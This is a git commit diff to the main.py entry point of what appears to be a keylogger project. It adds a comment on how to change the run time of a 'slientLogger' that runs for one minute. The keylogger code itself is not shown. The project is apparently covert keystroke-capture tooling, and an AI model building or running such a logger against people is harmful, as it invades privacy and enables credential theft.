8c69a30ab4ebb6fadfd6214f4f73483a1bd52595
Levi Hutchins <98019350+Levi-Hutchins@users.noreply.github.com>
2023-01-17 11:13:25 +1100

    documentation

--- main.py
+++ main.py
@@ -3,6 +3,7 @@ import datetime
 from src.KeyLogger import KeyLogger
 
 if __name__ == "__main__":
+    # You can edit the run time but changing the timedelta argument to mintues/ hours etc.
     stop_time = datetime.datetime.now() + datetime.timedelta(minutes=1)
     slientLogger = KeyLogger(stop_time)
     slientLogger.run()
